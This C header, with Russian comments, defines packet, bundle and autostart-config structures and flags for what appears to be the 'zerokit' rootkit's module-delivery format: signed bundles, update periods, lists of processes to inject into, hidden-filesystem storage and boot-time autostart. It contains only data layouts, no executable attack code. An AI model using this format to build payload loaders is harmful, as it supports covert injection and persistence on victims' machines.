#ifndef __MODSHARED_PACK_PROTECT_H_
#define __MODSHARED_PACK_PROTECT_H_

#pragma pack(push, 1)
typedef struct _sign_pack_header_t
{
    uint32_t sizeOfFile;// Размер файла включая данный заголовок.
    uint8_t sign[512];  // 4096-битная подпись.
    uint32_t origSize;  // Оригинальный размер файла (после распаковки).
    uint32_t reserved1; // Используется для различных целей.
} sign_pack_header_t, *psign_pack_header_t;

typedef struct _bundle_header
{
    uint32_t sizeOfPack; // Размер всей пачки без учёта текущего заголовка.
    uint32_t numberOfFiles; // Количество файлов в пачке.
    uint32_t nameLen; // Длина имени бандла.
    char name[ZFS_MAX_FILENAME]; // Имя бандла, которое зерокитом будет использоваться для создания папки в /usr/.
    uint32_t updatePeriod; // Период в минутах между запросами на проверку наличия обновления бандла.
    uint32_t lifetime; // Время жизни бандла в часах начиная с момента, когда зерокит его обработает. (0 - бесконечно).
    uint32_t flags; // Флаги.
} bundle_header_t, *pbundle_header_t;

typedef struct _bundle_file_header
{
    char fileName[ZFS_MAX_FILENAME]; // Имя файла.
    uint32_t fileSize;          // Размер файла.
    uint32_t flags;             // Флаги, в которых будет указываться информация необходимая для первичной обработки файла зерокитом.
    uint32_t processesCount;    // Количество процессов, в которые необходимо проинжектить/использовать для запуска.
    char process1Name[64];      // Имя первого процесса.
} bundle_file_header_t, *pbundle_file_header_t;

typedef struct _zautorun_config_entry
{
    char fileName[4 * ZFS_MAX_FILENAME];      // Имя исполняемого файла.
    char processName[64];   // Имя процесса.
    uint32_t flags;         // Флаги.
} zautorun_config_entry_t, *pzautorun_config_entry_t;

typedef struct _bundle_info_entry
{
    uint32_t updatePeriod;
    int64_t remainTime;
    char name[ZFS_MAX_FILENAME];
    uint8_t sha1[20];
} bundle_info_entry_t, *pbundle_info_entry_t;
#pragma pack(pop)

#define ANY_PROCESS '*'

#define BFLAG_UPDATE        0x00000001 // Флаг указывает на то, что бандл содержит обновление.

#define FLAG_IS64           0x00000001 // (q) Флаг указывает на 64-битность модуля.
#define FLAG_ISEXEC         0x00000002 // (x) Флаг указывает на исполняемость файла. Если этот флаг не выставлен, значит файл является или файлом-данных или модулем, который не должен обрабатываться зерокитом.
#define FLAG_SAVE_TO_FS     0x00000004 // (s) Флаг указывает на то, что файл должен быть сохранён в файловую систему.
#define FLAG_AUTOSTART      0x00000008 // (a) Флаг указывать на необходимость запускать модуль каждый раз при запуске системы.
#define TFLAG_FAKE          0x20000000 // Template flag.
#define TFLAG_EXISTING      0x40000000 // Template flag.
#define FLAG_NEW_MODULE     0x80000000

#endif // __MODSHARED_PACK_PROTECT_H_
